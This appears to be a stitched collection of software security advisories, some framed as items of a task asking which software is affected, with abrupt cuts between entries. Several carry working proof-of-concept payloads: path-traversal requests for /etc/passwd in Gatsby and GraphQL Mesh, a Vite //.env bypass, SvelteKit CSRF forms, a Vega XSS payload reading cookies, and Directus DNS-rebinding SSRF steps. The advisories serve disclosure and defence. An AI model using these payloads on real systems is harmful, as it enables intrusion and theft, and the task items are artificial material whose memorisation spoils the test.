Input: ### Issue\nSnowflake was informed via our bug bounty program of a command injection vulnerability in the Snowflake NodeJS driver via SSO browser URL authentication.\n\n### Impacted driver package: \nsnowflake-connector-nodejs\n\n### Impacted version range: \nbefore [Version 1.6.21](https://community.snowflake.com/s/article/Node-js-Driver-Release-Notes) \n\n### Attack Scenario\nIn order to exploit the potential for command injection, an attacker would need to be successful in (1) establishing a malicious resource and (2) redirecting users to utilize the resource. The attacker could set up a malicious, publicly accessible server which responds to the SSO URL with an attack payload. If the attacker then tricked a user into visiting the maliciously crafted connection URL, the user\u2019s local machine would render the malicious payload, leading to a remote code execution. \n\nThis attack scenario can be mitigated through URL whitelisting as well as common anti-phishing resources.  \n\n### Solution\nOn April 18, 2023, Snowflake merged a patch that fixed a command injection vulnerability in the Snowflake NodeJS driver via SSO browser URL authentication. The vulnerability affected the Snowflake NodeJS driver before Version 1.6.21. We strongly recommend users upgrade to Version 1.6.21 as soon as possible via the following resources: [Snowflake NodeJS Driver](https://docs.snowflake.com/en/developer-guide/node-js/nodejs-driver)\n\n### Additional Information\nIf you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne.

Improper application of CSP isn't itself a vulnerability, but it does fail to prevent XSS in the event that there is a viable attack vector for an XSS attack.\n\n### Impact\nThere aren't any XSS attack vectors via the Apollo Server landing pages _known to Apollo_, so to our knowledge there is no impact. However, if there are existing XSS vectors that haven't been reported and patched, then all users of Apollo Server's landing pages have a vulnerability which won't be prevented by the current CSP implemented by the landing pages.\n\nPrior to version 4.7.1, there was no CSP implemented at all. However, the initial CSP implementation (4.7.1+) reused nonces. While this sufficiently resolved the issue w.r.t. scripts not running in Safari, it did not implement CSP in a safe or conventional way.\n\n### Patches\nThe issue is patched in the latest version of Apollo Server, v4.7.4. The changes can be reviewed in [the merge commit](https://github.com/apollographql/apollo-server/commit/0adaf80d1ee51d8c7e5fd863c04478536d15eb8c).\n\n### Workarounds\nThe landing page can be disabled completely until the patch can be upgraded to.\nhttps://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/#disabling-the-landing-page\n\n### References\nhttps://content-security-policy.com/nonce/.

Input: ### Summary\nThe issue involves a security vulnerability in Vite, where the server options can be bypassed using a double forward slash (`//`). This vulnerability poses a potential security risk as it can allow unauthorized access to sensitive directories and files. This document outlines the steps to address and mitigate this issue. Adding Extra References : ## Steps to Fix. **Update Vite**:Ensure that you are using the latest version of Vite. Security issues like this are often fixed in newer releases.\\n\\n2. **Secure the Server Configuration**:In your `vite.config.js` file, review and update the server configuration options to restrict access to unauthorized requests or directories. For example:```javascript\\n // vite.config.js\\n export default { server: {\\n fs: {\\n deny: ['private-directory'] // Restrict access to specific directories\n\n### Impact\nOnly users explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected, and only files in the immediate Vite project root folder could be exposed.\n\n### Patches\nFixed in vite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5\nAnd in the latest minors of the previous two majors: vite@3.2.7, vite@2.9.16\n\n### Details\nVite serve the application with under the root-path of the project while running on the dev mode. By default, vite using server options fs.deny to protected the sensitive information of the file. But, with simply double forward-slash, we can bypass this fs restriction. \n\n### PoC\n1. Create a new latest project of vite using any package manager. (here I'm using react and vue templates for tested and pnpm)\n2. Serve the application on dev mode using pnpm run dev.\n3. Directly access the file from url using double forward-slash (`//`) (e.g: `//.env`, `//.env.local`)\n4. Server Options `fs.deny` restrict successfully bypassed.\n\nProof Images:\n![proof-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![proof-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png).

Please identify the software name affected by it. Input: If you are using the `eks.Cluster` or `eks.FargateCluster` construct we need you to take action. Other users are not affected and can stop reading.\n\n### Impact \n\nThe AWS Cloud Development Kit (CDK) allows for the definition of Amazon Elastic Container Service for Kubernetes (EKS) clusters. `eks.Cluster` and `eks.FargateCluster` constructs create two roles that have an overly permissive trust policy. \n \nThe first, referred to as the _CreationRole_, is used by lambda handlers to create the cluster and deploy Kubernetes resources (e.g `KubernetesManifest`, `HelmChart`, ...) onto it. Users with CDK version higher or equal to  [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) (including v2 users) will be affected.\n \nThe second, referred to as the _default MastersRole_, is provisioned only if the `mastersRole` property isn't provided and has permissions to execute `kubectl` commands on the cluster. Users with CDK version higher or equal to [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) (including v2 users) will be affected.\n \nBoth these roles use the account root principal in their trust policy, which allows any identity in the account with the appropriate `sts:AssumeRole `permissions to assume it. For example, this can happen if another role in your account has `sts:AssumeRole` permissions on `Resource: \"*\"`.\n\n#### CreationRole \n\nUsers with CDK version higher or equal to [1.62.0](https://github.com/aws/aws-cdk/releases/tag/v1.62.0) (including v2 users). The role in question can be located in the IAM console. It will have the following name pattern: \n\n```console \n*-ClusterCreationRole-* \n```\n\n#### MastersRole \n\nUsers with CDK version higher or equal to [1.57.0](https://github.com/aws/aws-cdk/releases/tag/v1.57.0) (including v2 users) that are not specifying the `mastersRole` property. The role in question can be located in the IAM console. It will have the following name pattern: \n\n```console\n*-MastersRole-*\n```\n\n### Patches \n\nThe issue has been fixed in versions [v1.202.0](https://github.com/aws/aws-cdk/releases/tag/v1.202.0), [v2.80.0](https://github.com/aws/aws-cdk/releases/tag/v2.80.0). We recommend you upgrade to a fixed version as soon as possible. See [Managing Dependencies](https://docs.aws.amazon.com/cdk/v2/guide/manage-dependencies.html) in the CDK Developer Guide for instructions on how to do this.  \n \nThe new versions no longer use the account root principal. Instead, they restrict the trust policy to the specific roles of lambda handlers that need it. This introduces some breaking changes that might require you to perform code changes. Refer to https://github.com/aws/aws-cdk/issues/25674 for a detailed discussion of options. \n\n### Workarounds \n\n#### CreationRole \n\nThere is no workaround available for CreationRole. \n\n#### MastersRole \n\nTo avoid creating the _default MastersRole_, use the `mastersRole` property to explicitly provide a role. For example: \n\n```ts \nnew eks.Cluster(this, 'Cluster', { \n  ... \n  mastersRole: iam.Role.fromRoleArn(this, 'Admin', 'arn:aws:iam::xxx:role/Admin') \n}); \n```\n\n### References\n\n[https://github.com/aws/aws-cdk/issues/25674](https://github.com/aws/aws-cdk/issues/25674)\n\nIf you have any questions or comments about this advisory we ask that you contact AWS/Amazon Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com).

Input: ## Description\nThe [CSRF](https://owasp.org/www-community/attacks/csrf) protection enforced by the `@fastify/csrf-protection` library in combination with `@fastify/cookie` can be bypassed from network and same-site attackers under certain conditions.\n\n`@fastify/csrf-protection` supports an optional `userInfo` parameter that binds the CSRF token to the user. This parameter has been introduced to prevent cookie-tossing attacks as a fix for [CVE-2021-29624](https://www.cvedetails.com/cve/CVE-2021-29624). Whenever `userInfo` parameter is missing, or its value can be predicted for the target user account, network and [same-site](https://canitakeyoursubdomain.name/) attackers can 1. fixate a `_csrf` cookie in the victim's browser, and 2. forge CSRF tokens that are valid for the victim's session. This allows attackers to bypass the CSRF protection mechanism.\n\nAs a fix, `@fastify/csrf-protection` starting from version 6.3.0 (and v4.1.0) includes a server-defined secret `hmacKey` that cryptographically binds the CSRF token to the value of the `_csrf` cookie and the `userInfo` parameter, making tokens non-spoofable by attackers.

The unauthenticated attacker can filter users by columns that contain sensitive information and infer the values by the changes in the API responses.

A remote attacker with access to the Strapi admin panel can inject a crafted payload that executes code on the server into an email template that bypasses the validation checks that should prevent code execution.\n\n### IoC\n\nUsing just the request log files, the only IoC to search for is a `PUT` request to URL path `/users-permissions/email-templates`. This IoC only indicates that a Strapi email template was modified on your server and by itself does not indicate if your Strapi server has been compromised. If this IoC is detected, you will need to manually review your email templates on your Strapi server and backups of your database to see if any of the templates contain a `lodash` template delimiter (eg. `<%STUFF HERE%>`) that contains suspicious JavaScript code. Generally speaking these templates should look like the following, you may have minor adjustments but any unrecognized code should be considered suspicious.\n\nReset Password Template:\n\n```html\n<p>We heard that you lost your password. Sorry about that!</p>\n\n<p>But don\u2019t worry! You can use the following link to reset your password:</p>\n<p><%= URL %>?code=<%= TOKEN %></p>\n\n<p>Thanks.</p>\n```\n\nEmail Confirmation Template:\n\n```html\n<p>Thank you for registering!</p>\n\n<p>You have to confirm your email address. Please click on the link below.</p>\n\n<p><%= URL %>?confirmation=<%= CODE %></p>\n\n<p>Thanks.</p>\n```\n\nSpecifically you should look for odd code contained within the `<%STUFF HERE%>` blocks as this is what is used to bypass the lodash templating system. If you find any code that is not a variable name, or a variable name that is not defined in the template you are most likely impacted and should take immediate steps to confirm there are no malicious applications running on your servers.\n\n### Impact\n\nAll users on Strapi below 4.5.6 with access to the admin panel and the ability to modify the email templates\n.

Please identify the software name affected by it. Input: ### Summary\nThe SvelteKit framework offers developers an option to create simple REST APIs. This is done by defining a `+server.js` file, containing endpoint handlers for different HTTP methods.\n\nSvelteKit provides out-of-the-box cross-site request forgery (CSRF) protection to its users. The protection is implemented at `kit/src/runtime/server/respond.js`. While the implementation does a sufficient job of mitigating common CSRF attacks, the protection can be bypassed by simply specifying an upper-cased `Content-Type` header value. The browser will not send uppercase characters on form submission, but this check does not block all expected cross-site requests: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests\n\n### Details\nThe CSRF protection is implemented using the code shown below.\n\n``` javascript\n\t\tconst forbidden =\n\t\t\tis_form_content_type(request) &&\n\t\t\t(request.method === 'POST' ||\n\t\t\t\trequest.method === 'PUT' ||\n\t\t\t\trequest.method === 'PATCH' ||\n\t\t\t\trequest.method === 'DELETE') &&\n\t\t\trequest.headers.get('origin') !== url.origin;\n\n\t\tif (forbidden) {\n\t\t\tconst csrf_error = error(403, `Cross-site ${request.method} form submissions are forbidden`);\n\t\t\tif (request.headers.get('accept') === 'application/json') {\n\t\t\t\treturn json(csrf_error.body, { status: csrf_error.status });\n\t\t\t}\n\t\t\treturn text(csrf_error.body.message, { status: csrf_error.status });\n\t\t}\n```\n\nIf the incoming request specifies a POST/PUT/PATCH/DELETE method, the protection will compare the server\u2019s origin with the value of the HTTP Origin header. A mismatch between these values signals that a potential attack has been detected. The final check is performed on the request\u2019s `Content-Type` header whether the value is either `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`. If all the previous checks pass, the request will be rejected with an 403 error response.\nHowever, `is_form_content_type`, which is responsible for checking the value of the `Content-Type` header, is not sufficient to mitigate all possible variations of this type of attack. Since this function is checking `Content-Type` with lower-cased values, and the browser accepts upper-cased `Content-Type` header to be sent, a CSRF attack performed with the `Content-Type` header that contains an upper-cased character (e.g., `text/plaiN`) can circumvent the protection and the request will be processed by the endpoint handler.\n<!--\n### PoC\n1. Set up the SvelteKit with `POST /api/test` endpoint.\n2. Replace `REPLACE_DOMAIN` in the following HTML.\n``` html\n<script>\n(async() => {\n\tawait fetch(\"https://REPLACE_DOMAIN/api/test\", {method: \"POST\", headers:{\"Content-Type\":\"text/plaiN\"}, body: \"hello=world\"});\n})();\n</script>\n```\n3. Confirm that a POST request is processed by the server.\n-->\n### Impact\nIf abused, this issue will allow malicious requests to be submitted from third-party domains, which can allow execution of operations within the context of the victim's session, and in extreme scenarios can lead to unauthorized access to users\u2019 accounts. This may lead to all POST operations requiring authentication being allowed in the following cases:\n1. If the target site sets `SameSite=None` on its auth cookie and the user visits a malicious site in a Chromium-based browser\n2. If the target site doesn't set the `SameSite` attribute explicitly and the user visits a malicious site with Firefox/Safari with tracking protections turned off.\n3. If the user is visiting a malicious site with a very outdated browser.\n\n### Remediations\nIt is preferred to update to SvelteKit 1.15.2. It is also recommended to explicitly set `SameSite` to a value other than `None` on authentication cookies especially if the upgrade cannot be done in a timely manner..

Input: ### Impact\n\nThe gatsby-plugin-sharp plugin prior to versions 5.8.1 and 4.25.1 contains a path traversal vulnerability exposed when running the Gatsby develop server (`gatsby develop`).\n\nThe following steps can be used to reproduce the vulnerability:\n\n```\n# Create a new Gatsby project, and install gatsby-plugin-sharp\n$ npm init gatsby\n$ cd my-gatsby-site\n$ npm install gatsby-plugin-sharp\n\n\n# Add the plugin to gatsby-config.js\nmodule.exports = {\n  plugins: [\n    {\n      resolve: `gatsby-plugin-sharp`,\n    },\n  ]\n}\n\n# Start the Gatsby develop server\n$ gatsby develop\n\n# Execute the path traversal vulnerability\n$ curl \"http://127.0.0.1:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n\nIt should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.\n\n\n### Patches\n\nA patch has been introduced in `gatsby-plugin-sharp@5.8.1` and `gatsby-plugin-sharp@4.25.1` which mitigates the issue by ensuring that included paths remain within the project directory.\n\n\n### Workarounds\n\nAs stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.\n\nWe encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.\n\n\n### Credits\n\nWe would like to thank Patrick Rombouts and Bart Veneman [drukwerkdeal.nl] for bringing the issue to our attention.\n\n\n### For more information\n\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com)..

Please identify the software name affected by it. Input: ### Summary\nThe SvelteKit framework offers developers an option to create simple REST APIs. This is done by defining a `+server.js` file, containing endpoint handlers for different HTTP methods.\n\nSvelteKit provides out-of-the-box cross-site request forgery (CSRF) protection to it\u2019s users. The protection is implemented at `kit/src/runtime/server/respond.js#L52`. While the implementation does a sufficient job in mitigating common CSRF attacks, the protection can be bypassed by simply specifying a different `Content-Type` header value.\n\n### Details\nThe CSRF protection is implemented using the code shown below.\n\n```js\nconst forbidden =\n  // (1)\n  request.method === 'POST' &&\n  // (2)\n  request.headers.get('origin') !== url.origin &&\n  // (3)\n  is_form_content_type(request);\n\nif (forbidden) {\n  // (4)\n  const csrf_error = error(403, `Cross-site ${request.method} form submissions are forbidden`);\n  if (request.headers.get('accept') === 'application/json') {\n    return json(csrf_error.body, { status: csrf_error.status });\n  }\n  return text(csrf_error.body.message, { status: csrf_error.status });\n}\n```\nIf the incoming request specifies a POST method (1), the protection will compare the server\u2019s origin with the value of the HTTP `Origin` header (2). A mismatch between these values signals that a potential attack has been detected. The final check is performed on the request\u2019s `Content-Type` header (3) whether the value is either `application/x-www-form-urlencoded` or `multipart/form-data` (`kit/src/utils/http.js#L71`). If all the previous checks pass, the request will be rejected with an 403 error response (4).\n\nThe `is_form_content_type` validation is not sufficient to mitigate all possible variations of this type of attack. If a CSRF attack is performed with the `Content-Type` header set to `text/plain`, the protection will be circumvented and the request will be processed by the endpoint handler.\n<!--\n### PoC\nTo reproduce this issue, create and run a simple server (by default running on `localhost:3000`) with a POST endpoint handler such as:\n\n```js\nexport async function POST({ request }) {\n    const data = await request.json(); \n    console.log(JSON.stringify(data));\n    return new Response(String('success'));\n}\n```\n\nNext, save the malicious HTML page:\n\n```html\n<!DOCTYPE html>\n<html>\n<head></head>\n<body>\n  <h1 id=\"name\"></h1>\n  <form action=\"http://localhost:3000/api/test\" method=\"POST\" enctype=\"text/plain\">\n    <input type=\"hidden\" name=\"&#123;&quot;name&quot;&#58;&quot;test\" value=\"&quot;&#44;&quot;age&quot;&#58;123&#125;\" />\n    <input type=\"submit\" value=\"Submit\" />\n  </form>\n</body>\n</html>\n```\n\nin a file named `index.html`. Run another web server, using Python\u2019s built in http.server module (`python -m http.server`, by default running on `localhost:8000`), navigate to [http://localhost:8000/index.html](http://localhost:8000/index.html) and click the `Submit` button. \n\nVerify that the browser\u2019s URL has changed to `localhost:3000` and that the text `success` is displayed on the screen. Additionally, inspect the console of the SvelteKit web server and verify that the request body (`{\"name\":\"test=\",\"age\":123}`) was parsed as valid JSON and printed out. \n\nIt's worth noting that this attack is possible only for JSON request bodies. Form data sent using `text/plain` will be rejected by the server. \n-->\n### Impact\n\nIf abused, this issue will allow malicious requests to be submitted from third-party domains, which can allow execution of operations within the context of the victim's session, and in extreme scenarios can lead to unauthorized access to users\u2019 accounts.\n\n### Remediation\n\nSvelteKit 1.15.1 updates the `is_form_content_type` function call in the CSRF protection logic to include `text/plain`.\n\nAs additional hardening of the CSRF protection mechanism against potential method overrides, SvelteKit 1.15.1 is now performing validation on PUT, PATCH and DELETE methods as well. This latter hardening is only needed to protect users who have put in some sort of `?_method=` override feature themselves in their `handle` hook, so that the request that `resolve` sees could be `PUT`/`PATCH`/`DELETE` when the browser issues a `POST` request..

A remote attacker could forge an ID token that is signed using the 'None' type algorithm to bypass authentication and impersonate any user that use AWS Cognito for authentication.\n\n### IoC\n\nReviewing of application logs is recommended to detect any suspicious activity. Running the following regex pattern will extract all ID tokens sent to `/api/auth/cognito/callback`.\n\n`/\\/api\\/auth\\/cognito\\/callback\\?[\\s\\S]*id_token=\\s*([\\S]*)/`\n\nOnce you have a list of the ID tokens, you will need to verify each token using the public key file for your AWS Cognito user pool that you can download from `https://cognito-idp.{region}.amazonaws.com/{userPoolId}/.well-known/jwks.json`. If there are any JWT tokens that cannot be verified using the correct public key, then you need to inspect the JWT body and see if it contains the `email` and `cognito:username` claims (example below).\n\n```json\n{\n  \"cognito:username\": \"auth-bypass-example\",\n  \"email\": \"user@example.com\"\n}\n```\n\nIf there are any JWTs that have this body, verify when the account with the email address was created. If the account was created earlier than the request to `/api/auth/cognito/callback` with the invalid JWT token, then you need to contact the user to inform them their account has been breached!\n\nAfter upgrading to Strapi v4.6.0 or greater you will need to reconfigure your AWS Cognito provider to include the JWKS URL for it to work properly. If you do not reconfigure your provider you will receive an error message when attempting to login.\n\n\n### Impact\n\nAny Strapi user using the users-permissions AWS Cognito provider before 4.6.0\n.

Input: ### Impact\n`next-auth` applications using OAuth provider versions before `v4.20.1` are affected.\n\nA bad actor who can spy on the victim's network or able to social engineer the victim to click a manipulated login link could intercept and tamper with the authorization URL to **log in as the victim**, bypassing the CSRF protection.\n\nAs an example, an attack can happen in the following scenario. \n\n> TL;DR: The attacker steals the victim's authenticated callback by intercepting and tampering with the authorization URL created by `next-auth`.\n\n1. The victim attempts to log in to the `next-auth` site. For example https://next-auth-example.vercel.app/\n2. `next-auth` sets the `checks` cookies according to how the OAuth provider is configured. In this case, `state` and `pkce` are set by default for the Google Provider.\n<img width=\"1971\" alt=\"Screen Shot 2023-03-03 at 09 54 26\" src=\"https://user-images.githubusercontent.com/31528554/222619750-a2062bb8-99eb-4985-a75c-d75acd3da67e.png\">\n\n3. The attacker intercepts the returned authorization URL, strips away the OAuth check (nonce, state, pkce), and returns the URL _without_ the check to the victim's browser. For example:\nFrom \n```https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=client_id&scope=openid%20email%20profile&response_type=code&redirect_uri=https%3A%2F%2Fnext-auth-example.vercel.app%2Fapi%2Fauth%2Fcallback%2Fgoogle&state=state&code_challenge=code_challenge&code_challenge_method=S256&service=lso&o2v=2&flowName=GeneralOAuthFlow```\nto\n```https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=client_id&scope=openid%20email%20profile&response_type=code&redirect_uri=https%3A%2F%2Fnext-auth-example.vercel.app%2Fapi%2Fauth%2Fcallback%2Fgoogle&service=lso&o2v=2&flowName=GeneralOAuthFlow```.\nNotice the parameters `state`, `code_challenge` and `code_verifier` are removed from the victim's address bar.\n\n4. The victim attempts to log in using their OAuth account.\n\n5. The Authorization Server logs the victim in and calls back to the `next-auth` `api/auth/callback/:providerId`endpoint. \n5.1. The attacker intercepts and logs this callback URL for later use.\n5.2. `next-auth` checks the callback call from OAuth Authorization Server (doesn't have checks) and compares the checks with the cookies set (has checks) at step 2. This check will fail, resulting in the victim isn't logged in. However, at this step, the Authorization Server has already accepted the victim's request to log in and generated/sent a `code` in the URL.\n6. The attacker now has an authorization URL with the `code` that the AS will exchange for valid `access_token`/`id_token` and can log in as the victim automatically. They can open a new browser window and paste in the URL logged at step 5.1 and log in as the victim.\n\n\n### Patches\nWe patched the vulnerability in `next-auth` `v4.20.1` \nTo upgrade, run one of the following:\n```\nnpm i next-auth@latest\n```\n```\nyarn add next-auth@latest\n```\n```\npnpm add next-auth@latest\n```\n\n### Workarounds\n\nUpgrading to `latest` is the recommended way to fix this issue. However, using [Advanced Initialization](https://next-auth.js.org/configuration/initialization#advanced-initialization), developers can manually check the [callback request](https://next-auth.js.org/getting-started/rest-api#getpost-apiauthcallbackprovider) for `state`, `pkce`, and `nonce` against the provider configuration, and abort the sign-in process if there is a mismatch. Check out the [source code](https://github.com/nextauthjs/next-auth/blob/v4/packages/next-auth/src/core/lib/oauth/checks.ts) for help.\n\n### References\n- [CSRF](https://www.rfc-editor.org/rfc/rfc6749#section-10.12)\n- [PKCE vs nonce](https://danielfett.de/2020/05/16/pkce-vs-nonce-equivalent-or-not/)\n- [OAuth provider options](https://next-auth.js.org/configuration/providers/oauth)\n- [`checks` provider config](https://authjs.dev/reference/core/providers#checks).

The validation in [`/api/src/services/file.ts`](https://github.com/directus/directus/blob/main/api/src/services/files.ts) first checks if the resolved IP address for a domain name does not a resolve to an IP address in the deny list:\n\n```js\nlet ip = resolvedUrl.hostname;\n\nif (net.isIP(ip) === 0) {\n    try {\n        ip = (await lookupDNS(ip)).address;\n    } catch (err: any) {\n        logger.warn(err, `Couldn't lookup the DNS for url ${importURL}`);\n        throw new ServiceUnavailableException(`Couldn't fetch file from url \"${importURL}\"`, {\n            service: 'external-file',\n        });\n    }\n}\n\nif (env.IMPORT_IP_DENY_LIST.includes('0.0.0.0')) {\n    const networkInterfaces = os.networkInterfaces();\n\n    for (const networkInfo of Object.values(networkInterfaces)) {\n        if (!networkInfo) continue;\n\n        for (const info of networkInfo) {\n            if (info.address === ip) {\n                logger.warn(`Requested URL ${importURL} resolves to localhost.`);\n                throw new ServiceUnavailableException(`Couldn't fetch file from url \"${importURL}\"`, {\n                    service: 'external-file',\n                });\n            }\n        }\n    }\n}\n\nif (env.IMPORT_IP_DENY_LIST.includes(ip)) {\n    logger.warn(`Requested URL ${importURL} resolves to a denied IP address.`);\n    throw new ServiceUnavailableException(`Couldn't fetch file from url \"${importURL}\"`, {\n        service: 'external-file',\n    });\n}\n```\n\nOnce it validates that the resolved IP address is not in the deny list, then it uses `axios` to `GET` the url and saves the response content.\n\n```js\ntry {\n    fileResponse = await axios.get<Readable>(encodeURL(importURL), {\n        responseType: 'stream',\n    });\n} catch (err: any) {\n    logger.warn(err, `Couldn't fetch file from url \"${importURL}\"`);\n    throw new ServiceUnavailableException(`Couldn't fetch file from url \"${importURL}\"`, {\n        service: 'external-file',\n    });\n}\n```\n\nHowever, this validation check and fetching the web resource causes to DNS queries that enable a DNS rebinding attack. On the first DNS query, an attacker controlled name server can be configured to resolve to an external IP address that is not in the deny list to bypass the validation. Then when `axios` is called, the name server resolves the domain name to a local IP address.\n\n### PoC\nTo demonstrate we will be using an online tool named [rebinder](https://lock.cmpxchg8b.com/rebinder.html). Rebinder randomly changes the IP address it resolves to depending on the subdomain. For an example, `7f000001.8efa468e.rbndr.us` can resolve to either `142.250.70.142` (google.com) or **`127.0.0.1`**. Sending multiple `POST` requests to `/files/import` using this domain will eventually cause a resolution to `142.250.70.142` first to bypass the validation then fetch the sensitive from an internal server when `axios` is called.\n\nThe following screenshots show what it looks like when a successful attack occurs.\n\n*Downloading a file named `secret.txt` from a webserver running from `http://127.0.0.1/secret.txt`*\n![image](https://user-images.githubusercontent.com/6276577/218124035-26f7f0c3-47b3-424d-b4d4-bd3b47161983.png)\n\n*Receiving the request from the internal server. Note that the incoming connection is from **127.0.0.1**.*\n![image](https://user-images.githubusercontent.com/6276577/218124119-87b8d5d6-934d-4e07-be4d-066616a9a435.png)\n\n*After downloading the file it leaks the content of the secret file.*\n![image](https://user-images.githubusercontent.com/6276577/218122210-87b2e478-1081-4830-a9ea-e5d9f39bb129.png)\n\n### Impact\nAn attacker can exploit this vulnerability to access highly sensitive internal server and steal sensitive information. An example is on Cloud Environments that utilise internal APIs for managing machine and privileges. For an example, if `directus` is hosted on AWS EC2 instance and has an IAM role assigned to the EC2 instance then an attacker can exploit this vulnerability to steal the AWS access keys to impersonate the EC2 instance using the AWS API.\n.

The `directus_refresh_token` is not redacted properly from the log outputs and can be used to impersonate users without their permission. \n\n### Details\n\nUsing `v9.23.1`, I am seeing that the `directus_refresh_token` is not properly redacted as indicated by https://github.com/directus/directus/blob/7c479c5161639aac466c763b6b958a9524201d74/api/src/logger.ts#L13\n\nI'm classifying this as a security vulnerability because if someone has access to the log outputs, for example with a shared Cloud account or Splunk implementation, they could exchange the refresh token using `/auth/refresh` for an access token and use the token to perform actions on behalf of an unsuspecting user. This situation creates issues with accountability and non-repudiation because we can no longer have confidence that actions taken in the application were authorized or even performed by the logged-in user. \n\nA couple of examples of this are:\n- A disgruntled employee deletes all of the data to get even with a target team member before logging off on their last day\n- Under the guise of their unsuspecting boss, a mischievous engineer uploads _questionable_ images that get displayed on internal or external facing content sites\n\nThe list could go on but I think these communicate the risk of an internal threat that has access to this information \ud83d\ude06 \n\n### PoC\n1. Set `LOG_STYLE=\"raw\"` and run Directus v9.23.1\n1. Log in to the application\n1.

I intentionally ran this with `npx directus start | pino-pretty` so logs would be easier to read. It can also be reproduced by running `npx directus start` alone. \n\n    ![image](https://user-images.githubusercontent.com/13325146/224877190-54e12d7e-3c3e-42d3-9e21-0bd4439f4f44.png)\n\n1.

An insider with knowledge of this could do many mischievous things and get away with them for a long time without victims knowing about it. \n. Top 1 search result is npm:directus.

The type of the 1st argument is supposed to be an array, but it's not enforced.\n\nThis makes it possible to specify any object with a `push` function as the 1st argument, `push` function can be set to any function that can be access via `event.view` (no all such functions can be exploited due to invalid context or signature, but some can, e.g. `console.log`).\n\n### Details\nThe issue is that [`lassoAppend`](https://github.com/vega/vega/blob/7eafbbd4d53d0ce9f08e74ff96c90d411b1bb80a/packages/vega-functions/src/functions/lasso.js#L13) doesn't enforce proper types of its arguments:\n```js\n.....\nexport function lassoAppend(lasso, x, y, minDist = 5) {\n    const last = lasso[lasso.length - 1];\n\n    // Add point to lasso if distance to last point exceed minDist or its the first point\n    if (last === undefined || Math.sqrt(((last[0] - x) ** 2) + ((last[1] - y) ** 2)) > minDist) {\n        lasso.push([x, y]);\n.....\n```\n\n### PoC\n\nUse the following Vega snippet (depends on browser's non-built-in `event.view.setImmediate` function, feel free to replace with `event.view.console.log` or alike and observe the result in the browser's console)\n\n```json\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"width\": 350,\n  \"height\": 350,\n  \"autosize\": \"none\",\n  \"description\": \"Toggle Button\",\n  \"signals\": [\n    {\n      \"name\": \"toggle\",\n      \"value\": false,\n      \"on\": [\n        {\n          \"events\": {\"type\": \"click\", \"markname\": \"circle\"},\n          \"update\": \"toggle ? false : true\"\n        }\n      ]\n    },\n    {\n      \"name\": \"addFilter\",\n      \"on\": [\n        {\n          \"events\": {\"type\": \"mousemove\", \"source\": \"window\"},\n          \"update\": \"lassoAppend({'push':event.view.setImmediate},'alert(document.domain)','alert(document.cookie)')\"\n        }\n      ]\n    }\n  ],\n  \"marks\": [\n    {\n      \"name\": \"circle\",\n      \"type\": \"symbol\",\n      \"zindex\": 1,\n      \"encode\": {\n        \"enter\": {\n          \"y\": {\"signal\": \"height/2\"},\n          \"angle\": {\"value\": 0},\n          \"size\": {\"value\": 400},\n          \"shape\": {\"value\": \"circle\"},\n          \"fill\": {\"value\": \"white\"},\n          \"stroke\": {\"value\": \"white\"},\n          \"strokeWidth\": {\"value\": 2},\n          \"cursor\": {\"value\": \"pointer\"},\n          \"tooltip\": {\"signal\": \"{Tip: 'Click to fire XSS'}\"}\n        },\n        \"update\": {\"x\": {\"signal\": \"toggle === true ? 190 : 165\"}}\n      }\n    },\n    {\n      \"name\": \"rectangle\",\n      \"type\": \"rect\",\n      \"zindex\": 0,\n      \"encode\": {\n        \"enter\": {\n          \"x\": {\"value\": 152},\n          \"y\": {\"value\": 162.5},\n          \"width\": {\"value\": 50},\n          \"height\": {\"value\": 25},\n          \"cornerRadius\": {\"value\": 20}\n        },\n        \"update\": {\n          \"fill\": {\"signal\": \"toggle === true ?

Input: ### Summary\nMissing check vulnerability in the static file handler allows any client to access the files in the server's file system\n\n### Details\nWhen `staticFiles` is set in the `serve` settings in the configuration file, the following handler doesn't check if `absolutePath` is still under the directory provided as `staticFiles`;\n\n```ts\n  if (staticFiles) {\n    router.get('/:relativePath+', async request => {\n      let { relativePath } = request.params;\n      if (!relativePath) {\n        relativePath = 'index.html';\n      }\n      const absolutePath = path.join(baseDir, staticFiles, relativePath);\n      if (absolutePath.includes(staticFiles) && (await pathExists(absolutePath))) {\n        const readStream = fs.createReadStream(absolutePath);\n        return new Response(readStream as any, {\n          status: 200,\n        });\n      }\n      return undefined;\n    });\n ```\n\n### Example scenario\nTo reproduce it, set `staticFiles` to the relative path of a directory in `.meshrc.yml`;\n\n```yml\nserve:\n   staticFiles: ./public\n```\n\nThen start the server with `mesh dev`, and browse to `/..%2fpackage.json` then you will see the content of `package.json`. You can even go deeper to see sensitive data; `/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`\n\n### Impact and solution\nIf 